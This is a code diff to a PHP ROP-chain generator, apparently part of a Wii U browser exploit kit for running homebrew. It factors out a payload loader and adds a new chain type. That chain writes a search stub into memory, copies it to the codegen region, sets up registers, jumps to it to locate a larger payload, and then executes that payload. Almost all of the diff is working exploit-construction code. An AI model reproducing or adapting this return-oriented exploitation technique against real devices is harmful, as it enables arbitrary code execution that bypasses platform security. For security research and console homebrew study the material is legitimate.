@@ -121,28 +121,45 @@ function generate_ropchain()
     {
         generateropchain_type3();
     }
+    else if ($ropchainselect==4)
+    {
+        generateropchain_type4();
+    }
 
 	if($generatebinrop==0)$ROPCHAIN.= "\"";
 }
 
-function wiiuhaxx_generatepayload()
+function wiiuhaxx_loadfilebinary($pathToFile){
+    $payload = file_get_contents($pathToFile);
+	if($payload === FALSE || strlen($payload) < 4){
+        die("-1: Failed to load: ". $pathToFile);
+    }
+
+	$len = strlen($payload);    
+	
+	while($len & 0x3){
+		$payload.= pack("C*", 0x00);
+		$len = strlen($payload);
+	}
+    return $payload;
+}
+
+function wiiuhaxx_generatepayload(){
+    global $wiiuhaxxcfg_payloadfilepath;
+    return wiiuhaxx_loadfilebinary($wiiuhaxxcfg_payloadfilepath);
+}
+
+function wiiuhaxx_generatepayloadwithloader()
 {
 	global $wiiuhaxxcfg_payloadfilepath, $wiiuhaxxcfg_loaderfilepath;
 
-	$actual_payload = file_get_contents($wiiuhaxxcfg_payloadfilepath);
-	if($actual_payload === FALSE || strlen($actual_payload) < 4)return FALSE;
+	$actual_payload = wiiuhaxx_loadfilebinary($wiiuhaxxcfg_payloadfilepath);
 
 	$loader = file_get_contents($wiiuhaxxcfg_loaderfilepath);
 	if($loader === FALSE || strlen($loader) < 4)return FALSE;
 	
-	$len = strlen($actual_payload);    
-	
-	while($len & 0x3)//The actual payload size must be 4-byte aligned.
-	{
-		$actual_payload.= pack("C*", 0x00);
-		$len = strlen($actual_payload);
-	}
-  
+    $len = strlen($actual_payload);
+    
 	$loader .= pack("N*", $len);
 
 	return $loader . $actual_payload;
@@ -383,6 +400,7 @@ function ropgen_display_u32($skip_printval_initialization)//This prints the valu
 
 	ropchain_appendu32($ROP_CALLR28_POP_R28_TO_R31);//snprintf(outstr, "%x", 0x40, <value of r3 at the time of ropgen_display_u32() entry>);
 
+	$r28 = 0;  // This may be wrong, but without this line we get a warning.
 	ropchain_appendu32($r28);//r28
 	ropchain_appendu32(0x0);//r29
 	ropchain_appendu32(0x0);//r30
@@ -415,21 +433,11 @@ function ropgen_switchto_core1()
 	ropchain_appendu32(0x0);
 }
 
-function ropgen_writerop_toAddress($payload_srcaddr){
-    global $wiiuhaxxcfg_payloadfilepath;
-        
-    $actual_payload = file_get_contents($wiiuhaxxcfg_payloadfilepath);
-	if($actual_payload === FALSE || strlen($actual_payload) < 4) die("-1: Failed to load payload");
-
-	$len = strlen($actual_payload);    
-	
-	while($len & 0x3){
-		$actual_payload.= pack("C*", 0x00);
-		$len = strlen($actual_payload);
-	}
-    
+function ropgen_writerop_toAddress($path, $dstaddr){
+    $payload = wiiuhaxx_loadfilebinary($path);
+    $len = strlen($payload);
     for($i = 0; $i < $len; $i +=4) {
-        ropgen_writeword_tomem(hexdec (bin2hex (substr($actual_payload, $i, 4))),$payload_srcaddr + $i);
+        ropgen_writeword_tomem(hexdec (bin2hex (substr($payload, $i, 4))),$dstaddr + $i);
     }
 }
 
@@ -446,7 +454,7 @@ function generateropchain_type1()
 	//ropchain_appendu32(0x80808080);//Trigger a crash.
 
 	//ropgen_OSFatal($codepayload_srcaddr);//OSFatal(<data from the haxx>);
-
+    
 	ropgen_switchto_core1();//When running under internetbrowser, only core1 is allowed to use codegen. Switch to core1 just in case this thread isn't on core1(with some exploit(s) it may already be one core1, but do this anyway). OSSetThreadAffinity() currently returns an error for this, hence this codebase is only usable when this ROP is already running on core1.
 
 	ropgen_copycodebin_to_codegen($codegen_addr, $payload_srcaddr, $payload_size);
@@ -476,14 +484,14 @@ function generateropchain_type1()
 
 // The rop may get quite big here.
 function generateropchain_type2(){
-    global $payload_srcaddr, $ROPHEAP, $ROPCHAIN;
+    global $payload_srcaddr, $ROPHEAP, $ROPCHAIN, $wiiuhaxxcfg_payloadfilepath;
     
     $payload_size = 0x20000;
 	$codegen_addr = 0x01800000;
     //$payload_srcaddr must be defined by the code including this .php.
         
     // Write payload from file to
-    ropgen_writerop_toAddress($payload_srcaddr);
+    ropgen_writerop_toAddress($wiiuhaxxcfg_payloadfilepath, $payload_srcaddr);
         
     //When running under internetbrowser, only core1 is allowed to use codegen. Switch to core1 just in case this thread isn't on core1(with some exploit(s) it may already be one core1, but do this anyway). OSSetThreadAffinity() currently returns an error for this, hence this codebase is only usable when this ROP is already running on core1.
     ropgen_switchto_core1();
@@ -499,6 +507,66 @@ function generateropchain_type2(){
 function generateropchain_type3(){
     global $payload_srcaddr;
     ropgen_OSFatal($payload_srcaddr);
+}
+
+function generateropchain_type4()
+{
+	global $ROP_OSFatal, $ROP_Exit, $ROPHEAP, $ROPCHAIN, $payload_tmp_address, $wiiuhaxxcfg_searchpayloadfilepath, $payload_start_search,$valid_payload_dst_address, $payload_search_for;
+
+	$payload_size = 0x20000;
+	$codegen_addr = 0x01800000;    
+    
+    // $payload_tmp_address where to store payload from ROP.
+    if(!isset($payload_tmp_address)){
+        die('please set $payload_tmp_address to a valid, unused, tmp address.');
+    }
+    // $payload_start_search. start address of the payload search.
+    if(!isset($payload_start_search)){
+        die('please set $payload_start_search. This should contain the start address of the payload search');
+    }        
+    //$valid_payload_dst_address = 0x1D500000;
+    if(!isset($valid_payload_dst_address)){
+        die('please set $valid_payload_dst_address. This should address a region of 0x20000 bytes where the found payload it copied to.');
+    }
+    
+    //$payload_search_for
+    if(!isset($payload_search_for)){
+        die('please set $payload_search_for. This should contain a unqiue u32 value that is placed right before the payload.');
+    }
+    
+    // size 
+    $search_payload_length = strlen(wiiuhaxx_loadfilebinary($wiiuhaxxcfg_searchpayloadfilepath));
+    
+	ropgen_switchto_core1();//When running under internetbrowser, only core1 is allowed to use codegen. Switch to core1 just in case this thread isn't on core1(with some exploit(s) it may already be one core1, but do this anyway). OSSetThreadAffinity() currently returns an error for this, hence this codebase is only usable when this ROP is already running on core1.
+    
+    // Write our search payload somewhere into mem
+    ropgen_writerop_toAddress($wiiuhaxxcfg_searchpayloadfilepath,$payload_tmp_address);
+    
+    // Copy it to codegen
+    ropgen_copycodebin_to_codegen($codegen_addr, $payload_tmp_address, $search_payload_length);
+    
+    // Set up some parameters
+	$regs = array();
+	$regs[24 - 24] = $ROP_OSFatal;//r24
+	$regs[25 - 24] = $ROP_Exit;//r25
+	$regs[26 - 24] = $payload_size;//r26 sizeToCopy
+	$regs[27 - 24] = $payload_search_for - 0x04;// r27 SearchFor. substract 0x4 so we didn't find THIS accidentally.
+	$regs[28 - 24] = $payload_start_search;  //r28 start of search
+	$regs[29 - 24] = $valid_payload_dst_address ; //r29 target address
+	$regs[30 - 24] = 0x8;//r30 The payload can do this at entry to determine the start address of the code-loading ROP-chain: r1+= r30. r1+4 after that is where the jump-addr should be loaded from. The above r29 is a ptr to the input data used for payload loading.
+	$regs[31 - 24] = $ROPHEAP;//r31    
+	ropgen_pop_r24_to_r31($regs);//Setup r24..r31 at the time of payload entry. Basically a "paramblk" in the form of registers, since this is the only available way to do this with the ROP-gadgets currently used by this codebase.
+    
+    // And run it!
+	ropchain_appendu32($codegen_addr);//Jump to the codegen area where the payload was written.
+    
+    // We need this, not sure why tbh.
+	ropchain_appendu32(0x0);
+
+    // On success, we should now have our actual payload @valid_payload_dst_address. Lets copy it to codegen.
+	ropgen_copycodebin_to_codegen($codegen_addr, $valid_payload_dst_address, $payload_size);
+    // and run it!
+	ropchain_appendu32($codegen_addr);
 }
 
 ?>
